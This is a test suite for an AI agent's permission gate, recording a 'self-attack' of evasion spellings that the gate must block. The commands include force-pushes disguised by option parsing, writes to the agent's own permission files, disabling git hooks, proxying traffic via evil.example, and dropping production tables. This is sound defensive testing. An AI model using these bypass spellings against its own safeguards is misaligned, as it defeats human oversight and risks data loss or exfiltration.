// THE SELF-ATTACK ON THE FIXES OF EXIT REVIEW 10 (2026-09-30): 121 confirmed findings, 110 of them unauthorized ALLOW.
// Each test names the CAUSE, not the spellings. The spellings are the reviewers'; the statement is what must stay true.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { table, workspace, verdict } from './support/corpus.ts';
import { evaluate, type EvaluationContext } from '../src/authority/evaluate.ts';

const probe = (dir: string, name: string, input: Record<string, unknown>, over: Partial<EvaluationContext> = {}) =>
  evaluate(table, { profile: 'STANDARD', mode: 'NORMAL_DELIVERY', repoRoots: [dir], cwd: dir, ...over }, { tool: name, input }).verdict;

test('ONE reader decides whether a line is a help request - and an option, a redirection or an object is not one', () => {
  const dir = workspace({ 'app.yaml': 'kind: Deployment\n' });
  // not probes: the flag is an option VALUE, a redirection TARGET, behind `--`, or the verb carries it to a container
  for (const c of [
    'git push --force origin main > --help',
    'docker --context production run alpine ./deploy.sh --help',
    'docker --config /tmp/c run --privileged -v /:/h alpine sh /h/x.sh --help',
    'kubectl --context production delete pod x -- --help',
    'kubectl --context production delete pod x --cache-dir --help',
    'kubectl --context production set env deploy/x FOO=bar --field-manager --list',
    'redis-cli -h prod-cache.acme.com SET foo --help',
    'git stash push --all -m "note -a --help"',
    'bash --rcfile -n script.sh',
    'git bisect run ./run.sh --help',
  ])
    assert.notEqual(verdict(c, dir), 'ALLOW', c);
  // probes, including behind a redirection, a wrapper that takes an operand, or a flag known to take no value
  for (const c of [
    'git push --help 2>&1',
    'flock /tmp/l git push --help',
    'flock -n /tmp/l git push --help',
    'git stash --all --help',
    'git push --force --help',
    'terraform -help apply',
    'psql -h prod-db.acme.com -V',
    'docker service create --help',
    'kubectl --context production get secrets --help',
  ])
    assert.notEqual(verdict(c, dir), 'DENY', c);
});

test('a SQL statement is a read only if it is one of a few shapes - not because no write verb appears in it', () => {
  const dir = workspace();
  const host = '-h prod-db.acme.com';
  // reads of schema and plan, by the client's own spellings
  for (const c of [
    `psql ${host} -c '\\d users'`,
    `psql ${host} -c 'explain select created_at from users'`,
    `mysql ${host} -e 'show create table users'`,
    `mysql ${host} -e 'describe users'`,
    `psql ${host} -l`,
    `redis-cli -h prod-cache.acme.com -a x TTL k`,
  ])
    assert.notEqual(verdict(c, dir), 'DENY', c);
  // NOT reads: the statement flag spelled as an abbreviation, a statement chained by a client command with no
  // semicolon, a DESCRIBE that analyzes, `-l` as a user NAME, `-c` as redis' cluster flag
  for (const c of [
    `psql ${host} -c 'show all' --comm='delete from t'`,
    `mysql ${host} -e 'show tables' --exe 'drop table t'`,
    `mysql ${host} -e 'show tables\\gdelete from t;'`,
    `mysql ${host} -e 'describe analyze delete t1 from t1 join t2 on t1.a=t2.a'`,
    `psql ${host} -U -l -c 'drop table t'`,
    `redis-cli -h prod-cache.acme.com -c DEL ttl user:1`,
    `mongosh prod-mongo.acme.com/app --eval 'describe(db.dropDatabase())'`,
    `psql ${host} -f /tmp/payload.sql`,
  ])
    assert.equal(verdict(c, dir), 'DENY', c);
});

test('make: the recipe is found by the option parser make has', () => {
  // covered in exit-review-10.test.ts; here only what the self-attack added
  const dir = workspace({ 'jobs.mk': 'deploy:\n\tgit push --force origin main\n', 'Makefile': 'all:\n\techo hi\n' });
  for (const c of ['make -f jobs.mk deploy', 'make -kf jobs.mk deploy', 'make --fil jobs.mk deploy', 'make -o -n -f jobs.mk deploy'])
    assert.equal(verdict(c, dir), 'DENY', c);
  assert.equal(verdict('make -n -f jobs.mk deploy', dir), 'ALLOW');
  assert.equal(verdict('make all', dir), 'ALLOW');
});

test('the freshness ledger: a path is stale when it or an ancestor was written, in any case, through any name', () => {
  const files = {
    Makefile: 'all:\n\techo hi\n',
    'evil.mk': 'all:\n\tgit push origin main\n',
    'evil/Makefile': 'all:\n\tgit push origin main\n',
    'sub/Makefile': 'all:\n\techo hi\n',
  };
  const dir = workspace(files);
  for (const c of [
    'cp evil/* . && make all',
    'cp -t sub evil/Makefile && make -C sub all',
    'mkdir n && cp evil/Makefile n && make -C n all',
    'for i in 1 2; do make all; cp evil.mk Makefile; done',
    'ln -s Makefile al; cat evil.mk > al; make all',
    'ln -s sub dl && cp evil/Makefile dl/Makefile && make -C sub all',
    'mv sub sub.old && mv evil sub && make -C sub all',
    "find . -maxdepth 1 -name Makefile -exec cp evil.mk {} \\; ; make all",
    'uniq evil.mk Makefile && make all',
    'sort evil.mk --output=Makefile && make all',
    'sort -o Makefile evil.mk && make all',
    "sed -n 'w Makefile' evil.mk && make all",
    'cp evil.mk MAKEFILE && make all',
    'cp evil.mk [M]akefile && make all',
  ])
    assert.notEqual(verdict(c, dir), 'ALLOW', c);
  // ...and ordinary work that writes something ELSE is not made stale
  for (const c of ['cp README.md x.txt && make all', 'sort a.txt > b.txt && make all', 'mkdir out && make all'])
    assert.equal(verdict(c, dir), 'ALLOW', c);
});

test('a working directory is a set: a conditional change leaves both possibilities, judged together', () => {
  const dir = workspace({ 'sub/keep': 'x', 'control-plane/a.md': 'x', 'control-plane/permissions/matchers.md': 'x', '.harness/runtime/pin.json': '{}' });
  for (const c of [
    'cd; tee .npmrc',
    'if true; then cd control-plane; fi; tee a.md',
    'true || cd sub; tee control-plane/a.md',
    '[ -d nope ] && cd sub; echo x > control-plane/a.md',
    'cd control-plane >/dev/null; tee a.md',
    'cd control-plane 2>&1; tee a.md',
    'pushd control-plane >/dev/null; tee a.md',
    'cd() { true; }; cd sub; tee control-plane/a.md',
    '! cd control-plane; tee a.md',
    'FOO=1 cd control-plane; tee a.md',
    'builtin -- cd control-plane; tee a.md',
    'noglob cd control-plane; tee a.md',
    'while cd control-plane; do break; done; tee a.md',
    'cd [cc]ontrol-plane && echo x > permissions/matchers.md',
    'f() { cd control-plane; }; f; tee a.md',
  ])
    assert.notEqual(verdict(c, dir), 'ALLOW', c);
  // ordinary work is exact: a real change into a real directory, a subshell, a pipeline
  for (const c of ['cd sub && ls', 'cd sub && tee ok.txt', '(cd sub && ls)', 'cd sub | cat', 'mkdir -p build && cd build && ls'])
    assert.equal(verdict(c, dir), 'ALLOW', c);
});

test('one lexer for the body of a substitution: comments, expansions, strings and case subjects', () => {
  const dir = workspace();
  for (const c of [
    'echo "$(case "a b"c in *) git push origin main ;; esac)"',
    'echo "$(case x in y) echo esac ;; true) git push origin main ;; esac)"',
    'echo "$(echo hi # )\ngit push origin main\n)"',
    'echo "$(echo ${x:-)} ; git push origin main)"',
    "echo $(echo $'\\')' ; git push origin main)",
    'echo $(echo ")" ; git push origin main)',
    'cat <<EOF\n$(echo ")"; git push origin main)\nEOF',
    'cat <<EOF\n`echo \\`git push origin main\\``\nEOF',
  ])
    assert.equal(verdict(c, dir), 'DENY', c);
});

test('a word the shell cuts at NUL, a line terminator in a name, and quoted prose that looks like a redirection', () => {
  const dir = workspace({ 'control-plane/permissions/matchers.md': 'x', 'README.md': 'x' });
  for (const c of [
    "touch $'control-plane/x\\0/../../y'",
    'echo x > control-plane/\rX',
    'touch control-plane/a b',
    'touch control-plane/a b',
  ])
    assert.equal(verdict(c, dir), 'DENY', c);
  for (const c of [
    'git commit -m "docs: explain why > control-plane/x.md is refused"',
    'echo "note: > control-plane/x.md"',
    'grep "> control-plane/x.md" README.md',
  ])
    assert.equal(verdict(c, dir), 'ALLOW', c);
  assert.equal(probe(dir, 'Write', { file_path: join(dir, 'control-plane/a\nb'), content: 'x' }), 'DENY');
});

test('carriers: every spelling of the option that carries a command or a directory', () => {
  const dir = workspace({ 'control-plane/permissions/matchers.md': 'x', 'sub/Makefile': 'all:\n\tgit push origin main\n', Makefile: 'all:\n\techo hi\n' });
  for (const c of [
    "flock /tmp/l --command 'cd control-plane/permissions && tee matchers.md'",
    "watch 'git status; git push origin main'",
    "env -S 'tee' control-plane/permissions/matchers.md",
    "env -S 'git commit -m x' --no-verify",
    'env -u X -C sub make all',
    'env --chd=sub make all',
    'env -iCcontrol-plane/permissions tee matchers.md',
    "env -S '-C control-plane/permissions tee matchers.md'",
    'find control-plane/permissions -name matchers.md -execdir tee matchers.md \\;',
    'git --no-pager -C control-plane/permissions rm matchers.md',
    'flock /tmp/l git -C control-plane/permissions rm matchers.md',
  ])
    assert.notEqual(verdict(c, dir), 'ALLOW', c);
  assert.equal(verdict('env FOO=1 make all', dir), 'ALLOW');
  assert.equal(verdict('watch -n 5 git status', dir), 'ALLOW');
});

test('the environment: names are FAMILIES, values are parsed as URLs, and every assignment of a list is carried', () => {
  const dir = workspace();
  for (const c of [
    'GIT_TRACE2_EVENT=.harness/runtime/state.json git log',
    'LIQUIBASE_COMMAND_URL=jdbc:postgresql://prod-db.acme.com/app liquibase drop-all',
    'export A=1 PGHOST=prod-db.acme.com; psql -c "DROP TABLE users"',
    "export 'PGHOST=prod-db.acme.com'; psql -c 'DROP TABLE users'",
    'export A=1 EDITOR=/tmp/x; git commit --allow-empty',
    'npm_config_script_shell=/tmp/x npx tsc',
    'PYTHONUSERBASE=/tmp/ub pip3 list',
    'https_proxy=http://localhost:80@evil.example:3128 git fetch',
    "env -S 'https_proxy=http://evil.example git fetch'",
    'npm_config_https_proxy=http://evil.example:3128 npm outdated',
    "CARGO_BUILD_RUSTFLAGS='-C linker=/tmp/x' cargo build",
    'GOCACHEPROG=/tmp/x go build ./...',
    'NODE_OPTIONS=--inspect=0.0.0.0:9229 npm test',
    'PHPRC=/tmp/evil php -v',
  ])
    assert.notEqual(verdict(c, dir), 'ALLOW', c);
  for (const c of ['NODE_OPTIONS=--max-old-space-size=4096 npm test', 'npm_config_loglevel=silent npm test', 'GIT_TRACE=1 git log', 'NODE_ENV=production npm run build'])
    assert.equal(verdict(c, dir), 'ALLOW', c);
});

test('containers: the twins of every verb, in every group', () => {
  const dir = workspace();
  for (const c of [
    'docker buildx imagetools create -t reg.example/x:1 reg.example/x:0',
    'docker compose publish -y reg.example/app:1',
    'docker buildx build --cache-to type=registry,ref=reg.example/x:cache .',
    'docker compose down -vt 1',
    'docker compose rm -fsv',
    'podman system reset --force',
    'docker volume create -o device=/etc --opt type=none --opt o=bind hostetc',
  ])
    assert.notEqual(verdict(c, dir), 'ALLOW', c);
  for (const c of ['docker --context prod service logs web', 'docker --context production compose logs', 'docker --context production node inspect n1'])
    assert.equal(verdict(c, dir), 'DENY', c);
  for (const c of ['docker ps', 'docker logs app', 'docker compose ps', 'docker build .'])
    assert.equal(verdict(c, dir), 'ALLOW', c);
});

test('the hooks directory, its own name, what it links to and what decides where it is', () => {
  const dir = mkdtempSync(join(tmpdir(), 'ego-hk-'));
  mkdirSync(join(dir, '.git'), { recursive: true });
  mkdirSync(join(dir, 'githooks'));
  mkdirSync(join(dir, 'scripts'));
  writeFileSync(join(dir, '.git/config'), '[core]\n\thooksPath = githooks\n[include]\n\tpath = ../.gitconfig\n');
  writeFileSync(join(dir, '.gitconfig'), '[user]\n\tname = x\n');
  writeFileSync(join(dir, 'scripts/h.sh'), '#!/bin/sh\n');
  writeFileSync(join(dir, 'package.json'), '{}');
  symlinkSync('../scripts/h.sh', join(dir, 'githooks/pre-commit'));
  for (const c of ['cp scripts/pre-commit githooks/', 'mv githooks githooks.old', 'git rm -rf githooks', 'echo x > GITHOOKS/pre-commit', 'rm -rf githooks'])
    assert.equal(probe(dir, 'Bash', { command: c }), 'DENY', c);
  for (const p of ['scripts/h.sh', '.gitconfig', 'githooks/x']) assert.equal(probe(dir, 'Write', { file_path: join(dir, p), content: 'x' }), 'DENY', p);
  assert.equal(probe(dir, 'Write', { file_path: join(dir, 'src/a.ts'), content: 'x' }), 'ALLOW');
  assert.equal(probe(dir, 'Bash', { command: 'ls githooks' }), 'ALLOW');
  // an empty hooks path switches every hook off
  const plain = workspace();
  for (const c of ['git -c core.hooksPath= commit -m x', "git config core.hooksPath ''"]) assert.equal(verdict(c, plain), 'DENY', c);
  assert.equal(verdict('git config core.hooksPath', plain), 'ALLOW');
});

test('git read-only plumbing is not the mutator it shares a prefix with, in the advisory mode', () => {
  const dir = workspace();
  const adv = (c: string) => probe(dir, 'Bash', { command: c }, { mode: 'PRODUCTION_ADVISORY' });
  for (const c of ['git tag -l', 'git tag', 'git tag --contains HEAD', 'git merge-base main HEAD']) assert.notEqual(adv(c), 'DENY', c);
  for (const c of ['git tag v1', 'git tag -a v1 -m x', 'git tag -l -m x', 'git merge feature']) assert.equal(adv(c), 'DENY', c);
});
